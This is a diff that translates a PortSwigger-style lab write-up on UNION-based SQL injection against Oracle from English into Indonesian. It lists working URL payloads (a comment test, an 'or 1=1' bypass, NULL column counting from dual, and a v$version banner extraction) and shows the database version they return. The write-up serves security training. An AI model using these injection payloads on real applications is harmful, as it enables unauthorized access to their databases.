@@ -1,111 +1,111 @@
 # SQL Injection Attack: Querying the Database Type and Version on Oracle
 
-This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+Lab ini berisi kerentanannya dalam SQL injection pada filter kategori produk. Anda dapat menggunakan serangan UNION untuk mendapatkan hasil dari query yang disuntikkan.
 
-To solve the lab, display the database version string.
+Untuk menyelesaikan lab ini, tampilkan string versi database.
 
 ---
 
-### **Key Consideration: Querying in Oracle**
+### **Pertimbangan Utama: Menanyakan di Oracle**
 
-In Oracle databases, every `SELECT` statement must specify a table to query from. If your `UNION SELECT` attack does not reference a table, you must include the `FROM` keyword followed by a valid table name. Oracle provides a built-in table called `dual` that can be used for this purpose. For example:
+Di database Oracle, setiap pernyataan `SELECT` harus menyebutkan tabel yang akan di-query. Jika serangan `UNION SELECT` Anda tidak merujuk ke tabel, Anda harus menyertakan kata kunci `FROM` diikuti dengan nama tabel yang valid. Oracle menyediakan tabel bawaan yang disebut `dual` yang dapat digunakan untuk tujuan ini. Misalnya:
 ```sql
 UNION SELECT 'abc' FROM dual
 ```
 
 ---
 
-### **Steps to Perform the Attack**
+### **Langkah-langkah Melakukan Serangan**
 
-#### **Step 1: Analyze the Query Structure**
-By injecting the payload:
+#### **Langkah 1: Analisis Struktur Query**
+Dengan menyuntikkan payload berikut:
 ```
 /filter?category=Gifts'--
 ```
-The application likely executes a query like:
+Aplikasi kemungkinan besar akan menjalankan query seperti ini:
 ```sql
 SELECT description, content 
 FROM posts 
 WHERE category = 'Gifts';
 ```
-This query:
-- Returns two columns: `description` and `content`.
+Query ini:
+- Mengembalikan dua kolom: `description` dan `content`.
 
-#### **Step 2: Determine the Number of Columns**
-To find the number of columns in the original query, inject:
+#### **Langkah 2: Tentukan Jumlah Kolom**
+Untuk mengetahui jumlah kolom dalam query asli, suntikkan:
 ```
 /filter?category=Gifts'+union+all+select+NULL,NULL+FROM+dual--
 ```
-If no errors occur, the query has two columns.
+Jika tidak ada kesalahan, query tersebut memiliki dua kolom.
 
-#### **Step 3: Extract Database Version**
-Oracle databases store version information in tables like `v$version` and `v$instance`. To retrieve the version string:
-1. Use the `v$version` table:
+#### **Langkah 3: Ekstrak Versi Database**
+Database Oracle menyimpan informasi versi dalam tabel seperti `v$version` dan `v$instance`. Untuk mengambil string versi:
+1. Gunakan tabel `v$version`:
    ```sql
    SELECT banner FROM v$version;
    ```
-2. Inject the payload:
+2. Suntikkan payload berikut:
    ```
    /filter?category=Gifts'+union+all+select+'1',banner+FROM+v$version--
    ```
 
-#### **Step 4: Handle Potential Errors**
-Using the `v$instance` table might result in an error:
+#### **Langkah 4: Menangani Kesalahan Potensial**
+Menggunakan tabel `v$instance` mungkin menghasilkan kesalahan:
 ```
 SELECT version FROM v$instance;
 ```
-Avoid this if the server rejects queries against `v$instance`.
+Hindari ini jika server menolak query terhadap `v$instance`.
 
 ---
 
-### **Valid Payloads**
+### **Payload yang Valid**
 
-#### **Initial Test Payloads**:
-- Display 4 items in "Gifts" category:
+#### **Payload Uji Awal**:
+- Menampilkan 4 item di kategori "Gifts":
   ```
   /filter?category=Gifts'--
   ```
-- Display all items using a bypass:
+- Menampilkan semua item dengan bypass:
   ```
   /filter?category=Gifts'+or+1=1--
   ```
 
-#### **Determine Column Count**:
-- Use:
+#### **Tentukan Jumlah Kolom**:
+- Gunakan:
   ```
   /filter?category=Gifts'+union+all+select+NULL,NULL+FROM+dual--
   ```
 
-#### **Retrieve Database Version**:
-- Use `v$version`:
+#### **Ambil Versi Database**:
+- Gunakan `v$version`:
   ```
   /filter?category=Gifts'+union+all+select+'1',banner+FROM+v$version--
   ```
 
 ---
 
-### **References**
+### **Referensi**
 
-- [Examining the Database Using SQL Injection](https://portswigger.net/web-security/sql-injection/examining-the-database)
+- [Menguji Database Menggunakan SQL Injection](https://portswigger.net/web-security/sql-injection/examining-the-database)
 - [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
 ---
 
-### **Illustrations**
+### **Ilustrasi**
 
-#### **Initial Display (Description and Content)**:
+#### **Tampilan Awal (Deskripsi dan Konten)**:
 ![img](images/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20Oracle/1.png)
 
-#### **Validating Column Count**:
+#### **Validasi Jumlah Kolom**:
 ![img](images/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20Oracle/2.png)
 
-#### **Retrieving Database Version**:
-Using the payload:
+#### **Mengambil Versi Database**:
+Menggunakan payload:
 ```
 /filter?category=Gifts'+union+all+select+'1',banner+FROM+v$version--
 ```
 
-The query returns the database version:
+Query tersebut mengembalikan versi database:
 ```
 Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
 ```
